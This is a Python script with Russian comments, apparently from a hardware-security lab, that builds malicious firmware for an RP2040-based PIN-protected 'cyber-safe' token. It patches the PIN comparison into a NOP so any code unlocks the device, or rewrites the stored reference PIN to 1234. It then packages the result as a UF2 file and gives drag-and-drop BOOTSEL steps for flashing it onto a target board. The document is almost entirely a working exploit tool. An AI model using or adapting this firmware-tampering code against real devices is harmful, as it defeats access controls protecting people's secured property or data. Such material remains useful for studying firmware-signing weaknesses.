#!/usr/bin/env python3
"""
attack6 — сборник «злого» прошивания для кибер-сейфа (RP2040, usb_token).

Вектор: RP2040 не проверяет подпись прошивки (bootrom валидирует только CRC32
самих 256 байт boot2), а BOOTSEL-mode поднимает USB-носитель со всей флешкой
по удержанию кнопки — значит, злоумышленнику с ~30 секундами доступа к плате
достаточно перетащить UF2-файл, чтобы навсегда подменить «хранителя».

Скрипт берёт чистый образ (reversing/program.bin) и собирает варианты:

  anypin — NOP вместо проверки совпадения цифры (0x10000c8c bne -> nop):
           разблокировка ЛЮБОЙ комбинацией из 4 нажатий;
  pin1234 — переписывание эталона PIN в rodata (0x100054FF):
           рабочий код становится 1234, родной 3952 перестаёт подходить.

Каждый вариант проверяется дизассемблированием изменённой области (capstone) и
сверкой, что остальной образ не тронут. Выдача: .bin (полный образ 0x7000) и
.uf2 (RP2040 family id 0xE48BFF56) для drag-and-drop в BOOTSEL.

Готовые образы в этом каталоге собраны командой:
    python3 make_evil_firmware.py ../reversing/program.bin
"""
import struct
import sys

UF2_MAGIC_START0 = 0x0A324655          # "UF2\n"
UF2_MAGIC_START1 = 0x9E5D5157
UF2_MAGIC_END    = 0x0AB16F30
UF2_FLAG_FAMILY  = 0x00002000
RP2040_FAMILY_ID = 0xE48BFF56
FLASH_BASE       = 0x10000000

# (имя, [(file_offset, ожидаемые_байты, новые_байты, описание)])
PATCHES = {
    "anypin": [(
        0xC8C,
        bytes([0x22, 0xD1]),              # bne 0x10000cd4 (fail-путь мигания)
        bytes([0x00, 0xBF]),              # nop — первое несовпадение больше не фейлит
        "0x10000c8c: bne fail -> nop (принимается любая комбинация)",
    )],
    "pin1234": [(
        0x5500,
        bytes([0x03, 0x09, 0x05, 0x02]),  # эталон 3952
        bytes([0x01, 0x02, 0x03, 0x04]),  # эталон 1234
        "0x100054FF: эталон PIN 3952 -> 1234",
    )],
}


def verify_disasm(image, patches, name):
    """Дизассемблируем зоны вокруг каждого патча — руками и глазами проверяемо."""
    import capstone
    md = capstone.Cs(capstone.CS_ARCH_ARM, capstone.CS_MODE_THUMB | capstone.CS_MODE_MCLASS)
    for off, old, new, desc in patches:
        lo, hi = off - 8, off + max(len(old), len(new)) + 8
        print(f"  [{name}] {desc}")
        for ins in md.disasm(image[lo:hi], FLASH_BASE + lo):
            mark = " <-" if lo <= ins.address - FLASH_BASE < lo + max(len(old), len(new)) else "   "
            print(f"    {mark} {ins.address:08X}  {ins.mnemonic:8s} {ins.op_str}")


def make_uf2(image, family=RP2040_FAMILY_ID):
    """Стандартный UF2: блоки по 256 байтов полезной нагрузки."""
    chunks = [image[i:i + 256] for i in range(0, len(image), 256)]
    nblocks = len(chunks)
    out = bytearray()
    for no, chunk in enumerate(chunks):
        addr = FLASH_BASE + no * 256
        block = struct.pack("<IIIIIIII",
                            UF2_MAGIC_START0, UF2_MAGIC_START1,
                            UF2_FLAG_FAMILY, addr, len(chunk), no, nblocks, family)
        block += chunk.ljust(476, b"\x00")
        block += struct.pack("<I", UF2_MAGIC_END)
        assert len(block) == 512
        out += block
    return bytes(out)


def sha(data):
    import hashlib
    return hashlib.sha256(data).hexdigest()[:16]


def main(argv):
    if len(argv) < 2:
        print(__doc__)
        return 1
    with open(argv[1], "rb") as f:
        original = f.read()
    print(f"=== attack6: сборка злых прошивок из {argv[1]} ({len(original)} байт) ===")
    print(f"образ-источник sha256[:16] = {sha(original)}")

    for name, patches in PATCHES.items():
        image = bytearray(original)
        print(f"\n--- вариант: {name} ---")
        for off, old, new, desc in patches:
            got = bytes(image[off:off + len(old)])
            if got != old:
                print(f"  ОШИБКА: по смещению 0x{off:x} ожидано {old.hex(' ')}, найдено {got.hex(' ')} — образ не тот")
                return 1
            image[off:off + len(new)] = new
            print(f"  патч 0x{off:04x}: {old.hex(' ')} -> {new.hex(' ')}")
        image = bytes(image)

        changed = [(i, original[i], image[i]) for i in range(len(original)) if original[i] != image[i]]
        print(f"  изменённых байт: {len(changed)} -> " +
              ", ".join(f"0x{i:04x}:{o:02x}->{n:02x}" for i, o, n in changed))
        verify_disasm(image, patches, name)

        bin_name = f"evil_{name}.bin"
        uf2_name = f"evil_{name}.uf2"
        with open(bin_name, "wb") as f:
            f.write(image)
        with open(uf2_name, "wb") as f:
            f.write(make_uf2(image))
        print(f"  записано: {bin_name} ({len(image)} B, sha256[:16]={sha(image)}), "
              f"{uf2_name} (BOOTSEL drag-and-drop)")
    print("\nготово. Доставка: удержать BOOTSEL на целевой плате, подключить USB, "
          "скопировать .uf2 — прошивка подменится без единого паяльного движения")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))